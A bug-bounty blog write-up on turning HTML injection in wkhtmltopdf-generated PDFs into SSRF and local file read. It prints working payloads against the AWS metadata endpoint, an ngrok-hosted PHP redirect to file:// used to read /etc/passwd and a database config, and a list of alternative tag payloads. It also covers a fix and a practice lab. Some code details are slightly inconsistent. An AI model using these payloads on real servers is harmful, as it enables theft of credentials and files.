---
title: "SSRF to Local File Read"
date: 2021-03-30
tags: [BugBounty, BugBountyTips, Server Side Request Forgery, Local File Disclosure, SSRF, LFI, Ruby On Rails, Rails]
excerpt: "SSRF to Local File Read"
header:
  image: "assets/images/BugBountyImages/ssrf/ssrf_to_lfi.png"

---

Greetings everyone, this blog post is about the vulnerability that I have identified in `Wkhtmltopdf` gem, which was allowing users to inject HTML in the pdf files, and after doing further research, I was able to identify that the parser's functionality was vulnerable to internal SSRF attack, which further allowed me to read server's local file.

Injecting the simple HTML payload the code section oft the application `"><h1>XSS</h1>`

<img src="https://raw.githubusercontent.com/Splint3r7/web/master/assets/images/BugBountyImages/ssrf/Screenshot_2021-03-24_at_8.22.58_PM.png" alt="">

Loading the PDF file show's the injected HTML has been successfully executed in our PDF file. 

<img src="https://raw.githubusercontent.com/Splint3r7/web/master/assets/images/BugBountyImages/ssrf/Screenshot_2021-03-24_at_8.26.05_PM.png" alt="">


So as you can see HTML injection is happening in our pdf file and at this time as one's my excitement level can be high, Since we know in these kinds of cases there are high chances to find internal SSRF or read local files from the server.

So the next thing I did is to send an XHR request using file:///,As mentioned in the blog post by noob ninja [LFI to XSS](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html).

```ruby
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script
```

But nothing happened. I realized that the script was blocked and the XHR request got failed. Okay so, the next thing that I have tried is to send the request to my server and checked the response headers. I used simple payload `"><img src="[http://406e7772.ngrok.io](http://406e7772.ngrok.io/)">` and I was presented with the `User-agent` header as `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34`.

I also tried to extract passwd file using the payload `"><iframe src="file:///etc/passwd" height="500" width="500">` it didn't worked as well, got a blank pdf file.

From the user-agent, `wkhtmltopdf` sounds suspicious to me, and after doing a bit of googling I was able to find that `wkhtmltopdf` is vulnerable to SSRF Attacks. [Issue link.](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570)

It was time to try to call AWS metadata API's and that's what I did. So I used an iframe to request internal AWS API's

```ruby
"><iframe src="http://169.254.169.254/latest/dynamic/instance-identity/" height="500" width="500">
```

and I was presented with meta data response. I was able to fetch instance identity.

```ruby
document
signature
pkcs7
rsa2048
```

So at this point it was a confirmed internal SSRF.

I didn't want to stop there, as I wanted to exploit it further and read the local files of the server. My hunger just to get read local files so I can sleep peacefully.

As mentioned in the above blog post, `wkhtmltopdf` is vulnerable to SSRF attack and it's through the location header.

```ruby
<?php
     header('location:http://127.0.0.1');
?>
```

So, what I did, create a php file with the following content:

```ruby
<?php header('location:file://'.$_REQUEST['url']); ?>
```

Hosted this PHP file on my ngrok server and then I sent the payload as:

```ruby
"><iframe height="2000" width="800" src=http://c723862e.ngrok.io/test.php?x=%2fetc%2fpasswd></iframe>
```

and i was presented with the PDF file

<img src="https://raw.githubusercontent.com/Splint3r7/web/master/assets/images/BugBountyImages/ssrf/Screenshot_2021-03-25_at_1.06.06_AM.png" alt="">

Yayy!! I was able to read the local file of the server. as I know more about the organization and how they store their application internally I tried to fetch their database.yml file in path `/config/database.yml` but it did not succeed. Later, I figured it out that they had their database file in `/var/company_name/config/database.yml` and I was able to read their DB file as well.

<img src="https://raw.githubusercontent.com/Splint3r7/web/master/assets/images/BugBountyImages/ssrf/Screenshot_2021-03-25_at_1.10.55_AM.png" alt="">

### Payloads

In case script and iframe are blocked you can use these payloads:

```html
embed
object
img
```

And you can further craft your payload as:

```html
"><embed src="http://169.254.169.254/latest/dynamic/instance-identity/" width=”200″ height=”200" />

"><object data="http://169.254.169.254/latest/dynamic/instance-identity/" width="400" height="300" type="text/html"></object>

"><img src='http://169.254.169.254/latest/dynamic/instance-identity/' height="2000" width="800">
```

### How to fix this SSRF?

To fix this vulnerability use `-disable-local-file-access` while converting HTML files into PDF.

if you are using wicked_pdf then introduce the `disable_local_file_access` parameter in `parse_others`function. it should look like this:

```ruby
r += make_options(options, [:book,
		                              :other_parameters
                                  :disable_smart_shrinking,
                                  :disable_local_file_access,
                                  :no_stop_slow_scripts], '', :boolean)
```

### Re-creating SSRF locally!

So, I did coded this for my friend so he can practice this bug type.

to reproduce this issue first you need to install wkhtmltopdf in your machine.

**Installation for Debian:**

```bash
$ apt-get install libfontenc1 xfonts-75dpi xfonts-base xfonts-encodings xfonts-utils openssl build-essential libssl-dev libxrender-dev git-core libx11-dev libxext-dev libfontconfig1-dev libfreetype6-dev fontconfig -y
$ wget https://github.com/wkhtmltopdf/wkhtmltopdf/releases/download/0.12.5/wkhtmltox_0.12.5-1.bionic_amd64.deb
$ dpkg -i wkhtmltox_0.12.5-1.bionic_amd64.deb
$ apt --fix-broken install
```

**Installation for Kali Linux:**

```bash
$ sudo apt-get install wkhtmltopdf
```

<script src="https://gist.githubusercontent.com/Splint3r7/09d82684dfe701a4aa319c5beffb64cd/raw/b6c84cb16868fe4974183d657cc0d3f16c6251c6/ssrf_wkhtmltopdf.php"></script>


<script src="https://gist.githubusercontent.com/Splint3r7/81661d9ef5e59c669bfcac650d53f707/raw/a94534a9b10771f6f84cb6afb4763523288fcf94/read.php"></script>

Host these two files on your apache2 server and now you can go to the URL `[http://127.0.0.1/ss2.php?xss="><h1>XSS</h1>](http://127.0.0.1/ss2.php?xss="><h1>XSS</h1>)` once you hit this URL, a test.html file will be created with your supplied input and a PDF file will be generated.

You are good to go with your SSRF to LFI lab and practice it further! ;)
